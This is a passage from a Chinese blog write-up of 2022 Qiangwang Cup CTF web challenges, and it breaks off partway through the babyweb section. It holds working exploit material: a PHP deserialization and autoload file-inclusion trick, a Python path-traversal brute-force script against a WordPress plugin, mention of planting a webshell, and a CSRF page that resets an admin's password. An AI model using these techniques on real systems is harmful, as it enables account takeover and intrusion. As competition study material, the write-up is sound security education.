{"blogid": "126076994", "writerAge": "码龄3年", "writerBlogNum": "107", "writerCollect": "682", "writerComment": "269", "writerFan": "1518", "writerGrade": "5级", "writerIntegral": "3141", "writerName": "yu22x", "writerProfileAdress": "writer_image\\profile_126076994.jpg", "writerRankTotal": "8345", "writerRankWeekly": "12134", "writerThumb": "446", "writerVisitNum": "242059", "blog_read_count": "2523", "blog_time": "于 2022-08-01 17:11:53 发布", "blog_title": "2022强网杯web（部分）", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul><li><a href=\"#rcefile_1\">强网先锋—rcefile</a></li><li><a href=\"#WPUM_29\">强网先锋—WP-UM</a></li><li><a href=\"#babyweb_83\">babyweb</a></li><li><a href=\"#crash_196\">crash</a></li><li><a href=\"#uploadpro_241\">uploadpro</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"rcefile_1\"></a>强网先锋—rcefile</h1>\n<p>www.zip下载源码，在config.inc.php中存在这么一个函数spl_autoload_register<img alt=\"在这里插入图片描述\" src=\"image\\455d5810b7534634a022f4e58aed60b7.png\"/><br/> 来看下他的作用：<br/> <img alt=\"在这里插入图片描述\" src=\"image\\ec5a90f978c649c6af2639cfd9e0f729.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\21cb6442cecb494e9dfc5ee359bb8da1.png\"/><br/> 举个例子：<br/> 比如有如下代码</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">spl_autoload_register</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>假设我们当前页面没有class A，他就会找a.php或者a.inc。然后包含他们。<br/> 所以我们只要上传一个含恶意代码的.inc文件，接着通过反序列化调用以这个文件的前缀为类名的对象即可。<br/> 1、首先上传.inc文件<br/> <img alt=\"在这里插入图片描述\" src=\"image\\7a76ee8d409540a4b7580f78443d8887.png\"/><br/> 2、生产序列化串</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">f1052cc954a6663a38a52b193b7851ff</span><span class=\"token punctuation\">{<!-- --></span>\n\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">f1052cc954a6663a38a52b193b7851ff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>将cookie修改成生成的反序列化串<br/> <img alt=\"在这里插入图片描述\" src=\"image\\2e58274c95c344c594dcccc1a7c4cf72.png\"/><br/> 触发漏洞<br/> <img alt=\"在这里插入图片描述\" src=\"image\\c19271e942fb4a7384f8abe873d6af9a.png\"/></p>\n<h1><a id=\"WPUM_29\"></a>强网先锋—WP-UM</h1>\n<p>题目给了源码文件。是个wordpress<br/> 然后进入网站给了这些话</p>\n<pre><code>猫哥最近用wordpress搭建了一个个人博客，粗心的猫哥因为记性差，所以把管理员10位的账号作为文件名放在/username下和15位的密码作为文件名放在/password下。\n\n并且存放的时候猫哥分成一个数字(作为字母在密码中的顺序)＋一个大写或小写字母一个文件，例如admin分成5个文件，文件名是1a 2d 3m 4i 5n\n\n这几天他发现了一个特别好用的wordpress插件，在他开心的时候，可是倒霉的猫哥却不知道危险的存在。\n</code></pre>\n<p>应该是需要爆破用户名和密码了。<br/> 搜索发现wordpress的user ment插件存在路径遍历漏洞。<br/> <code>https://wpscan.com/vulnerability/9d4a3f09-b011-4d87-ab63-332e505cf1cd</code><br/> 正好也对应上了题目名，应该没得跑了。wordpress后台登录处可以探测用户名是否存在。在首页看到了一个。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\4d9d98944b504ec79bb5c66108ac77c8.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\4c06b66c6f5b4532bb65b50ad4081f89.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\ca4a4cf74e034ae08c30c5b42beacdfc.png\"/><br/> 用户名不用跑了，就是这个了<code>MaoGePaMao</code>。<br/> 先注册个普通用户，然后上传文件抓个包。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\e629071b099c4183a22a3cdea6bcd82c.png\"/><br/> 拿到pf_nonce<br/> <img alt=\"在这里插入图片描述\" src=\"image\\71e06bd2205045a880de37c54a50a8a4.png\"/><br/> 脚本如下</p>\n<pre><code class=\"prism language-py\"><span class=\"token keyword\">import</span> requests \n<span class=\"token keyword\">import</span> string\ns <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters\nurl<span class=\"token operator\">=</span><span class=\"token string\">\"http://eci-2zefnon2z47ho8r5grw9.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php\"</span>\npasswd<span class=\"token operator\">=</span><span class=\"token string\">''</span>\nheaders<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">'Cookie'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'wordpress_435742472111dc623e9a384868ccf9e6=admin1%7C1659436049%7CiBbHcYGxHiaSkxyIAxDGCI9wgUGeUccPqC7wnsdzHHa%7Cefcfb909cd2a9a5d901cc939e9e4d70adba70d8f8328b63b692a8a9a699440f2; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_435742472111dc623e9a384868ccf9e6=admin1%7C1659436049%7CiBbHcYGxHiaSkxyIAxDGCI9wgUGeUccPqC7wnsdzHHa%7C7fda55d75fd7e914075e00e1a09991f11074e6744482274415409c3854beba06; wp-settings-time-2=1659263320'</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span>\n        s<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>j\n        r<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">'field_name'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'filepath'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'/../../../../../../../password/'</span><span class=\"token operator\">+</span>s<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'field_id'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'um_field_4'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'form_key'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'Upload'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'action'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'um_show_uploaded_file'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'pf_nonce'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'eaff7e1a60'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'is_ajax'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'true'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"remove\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            passwd<span class=\"token operator\">+=</span>j\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>passwd<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span>\n</code></pre>\n<p>得到密码<code>MaoGeYaoQiFeiLa</code><br/> 登录后台存在代码执行漏洞。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\8135020b3e3246c5a6456f74766ce1b4.png\"/><img alt=\"在这里插入图片描述\" src=\"image\\b083d1d3e0cd43debef581771bdc4114.png\"/><br/> 写个马进去。根据源码可以知道该文件的具体路径为/wp-content/plugins/akismet/akismet.php<br/> <img alt=\"在这里插入图片描述\" src=\"image\\c0fd91cab72d432486e64101addfdb19.png\"/><br/> flag位置在/usr/local/This_1s_secert下。</p>\n<h1><a id=\"babyweb_83\"></a>babyweb</h1>\n<p>先随便注册一个用户，登录后发现存在一个bot，可以修改密码，也可以给管理员发送一个链接。很明显是csrf嘛，构造一个修改密码的链接给管理员。<br/> 那我们直接拿着源码里面的简单改改就可以了。</p>\n<pre><code class=\"prism language-js\">\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> html<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>html lang<span class=\"token operator\">=</span><span class=\"token string\">\"zh-CN\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>head<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>meta charset<span class=\"token operator\">=</span><span class=\"token string\">\"utf-8\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>meta http<span class=\"token operator\">-</span>equiv<span class=\"token operator\">=</span><span class=\"token string\">\"X-UA-Compatible\"</span> content<span class=\"token operator\">=</span><span class=\"token string\">\"IE=edge\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>meta name<span class=\"token operator\">=</span><span class=\"token string\">\"viewport\"</span> content<span class=\"token operator\">=</span><span class=\"token string\">\"width=device-width, initial-scale=1\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>title<span class=\"token operator\">&gt;</span>后台管理系统<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>自定义函数<span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>script<span class=\"token operator\">&gt;</span>\n        <span class=\"token keyword\">var</span> ws <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">var</span> url <span class=\"token operator\">=</span> <span class=\"token string\">\"ws://127.0.0.1:8888/bot\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//var url = \"ws://101.34.94.44:4567/bot\";</span>\n        <span class=\"token keyword\">function</span> <span class=\"token function\">sendtobot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ws<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">var</span> msg <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sendbox\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n                ws<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n              document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sendbox\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n              document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"chatbox\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"你: \"</span> <span class=\"token operator\">+</span> msg <span class=\"token operator\">+</span> <span class=\"token string\">\"\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n                ws <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">WebSocket</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                ws<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onopen</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">event</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'connection open!'</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">var</span> msg <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sendbox\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n                    ws<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sendbox\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n                    document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"chatbox\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"你: \"</span> <span class=\"token operator\">+</span> msg <span class=\"token operator\">+</span> <span class=\"token string\">\"\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n                ws<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onmessage</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">ev</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                    <span class=\"token function\">botsay</span><span class=\"token punctuation\">(</span>ev<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n                ws<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onerror</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"connection error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n                ws<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onclose</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"connection close!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n                \n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">function</span> <span class=\"token function\">closeWebSocket</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ws<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n                ws<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                ws <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">function</span> <span class=\"token function\">botsay</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">content</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"chatbox\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bot: \"</span> <span class=\"token operator\">+</span> content <span class=\"token operator\">+</span> <span class=\"token string\">\"\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span>\n\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> Bootstrap <span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>link href<span class=\"token operator\">=</span><span class=\"token string\">\"static/bootstrap.css\"</span> rel<span class=\"token operator\">=</span><span class=\"token string\">\"stylesheet\"</span><span class=\"token operator\">&gt;</span>\n\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> <span class=\"token constant\">HTML5</span> shim 和 Respond<span class=\"token punctuation\">.</span>js 是为了让 <span class=\"token constant\">IE8</span> 支持 <span class=\"token constant\">HTML5</span> 元素和媒体查询（media queries）功能 <span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> 警告：通过 file<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span> 协议（就是直接将 html 页面拖拽到浏览器中）访问页面时 Respond<span class=\"token punctuation\">.</span>js 不起作用 <span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">if</span> lt <span class=\"token constant\">IE</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>script src<span class=\"token operator\">=</span><span class=\"token string\">\"https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.js\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>script src<span class=\"token operator\">=</span><span class=\"token string\">\"https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.js\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>script type<span class=\"token operator\">=</span><span class=\"token string\">\"text/javascript\"</span> src<span class=\"token operator\">=</span><span class=\"token string\">\"jquery-1.7.2.js\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span>endif<span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>head<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>body<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>nav <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"navbar navbar-default\"</span> role<span class=\"token operator\">=</span><span class=\"token string\">\"navigation\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> Brand and toggle <span class=\"token keyword\">get</span> grouped <span class=\"token keyword\">for</span> better mobile display <span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>div <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"navbar-header\"</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>button type<span class=\"token operator\">=</span><span class=\"token string\">\"button\"</span> <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"navbar-toggle\"</span> data<span class=\"token operator\">-</span>toggle<span class=\"token operator\">=</span><span class=\"token string\">\"collapse\"</span> data<span class=\"token operator\">-</span>target<span class=\"token operator\">=</span><span class=\"token string\">\".navbar-ex1-collapse\"</span><span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>span <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"sr-only\"</span><span class=\"token operator\">&gt;</span>Toggle navigation<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>span <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"icon-bar\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>span <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"icon-bar\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>span <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"icon-bar\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>button<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>a <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"navbar-brand\"</span> href<span class=\"token operator\">=</span><span class=\"token string\">\".\"</span><span class=\"token operator\">&gt;</span>主页<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span> Collect the nav links<span class=\"token punctuation\">,</span> forms<span class=\"token punctuation\">,</span> and other content <span class=\"token keyword\">for</span> toggling <span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n    \n    <span class=\"token operator\">&lt;</span>div <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"collapse navbar-collapse navbar-ex1-collapse\"</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>ul <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"nav navbar-nav navbar-right\"</span><span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>li<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string\">\"/logout\"</span><span class=\"token operator\">&gt;</span>登出<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">div&gt;&lt;!-- </span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">.</span>navbar<span class=\"token operator\">-</span>collapse <span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>nav<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>div style<span class=\"token operator\">=</span><span class=\"token string\">\"padding: 100px 100px 10px;\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>div <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"form-group\"</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>label <span class=\"token keyword\">for</span><span class=\"token operator\">=</span><span class=\"token string\">\"name\"</span><span class=\"token operator\">&gt;</span>一个好用简约的bot<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>label<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>textarea <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"form-control\"</span> rows<span class=\"token operator\">=</span><span class=\"token string\">\"15\"</span> id<span class=\"token operator\">=</span><span class=\"token string\">\"chatbox\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>textarea<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>div <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"form-group\"</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>label <span class=\"token keyword\">for</span><span class=\"token operator\">=</span><span class=\"token string\">\"name\"</span><span class=\"token operator\">&gt;</span>输入框<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>label<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string\">\"text\"</span> <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"form-control\"</span> placeholder<span class=\"token operator\">=</span><span class=\"token string\">\"输入 help 查看bot使用方法\"</span> id<span class=\"token operator\">=</span><span class=\"token string\">\"sendbox\"</span> value<span class=\"token operator\">=</span><span class=\"token string\">\"changepw 123456\"</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>div <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"form-group\"</span> style<span class=\"token operator\">=</span><span class=\"token string\">\"display: flex;flex-direction: column;align-items: flex-end;\"</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>button type<span class=\"token operator\">=</span><span class=\"token string\">\"button\"</span> <span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token string\">\"btn btn-info\"</span> style<span class=\"token operator\">=</span><span class=\"token string\">\"width: 20%;\"</span> onclick<span class=\"token operator\">=</span><span class=\"token string\">\"sendtobot()\"</span><span class=\"token operator\">&gt;</span>发送<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>button<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>script type<span class=\"token operator\">=</span><span class=\"token string\">\"text/javascript\"</span><span class=\"token operator\">&gt;</span><span class=\"token function\">sendtobot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>搭到vps上然后将地址发送过去，即可成功修改管理员密码（123456）。<br/> 接着用admin进行登录，买一个hint得到源码。<br/> <img alt=\"在这里插入图片描述\" 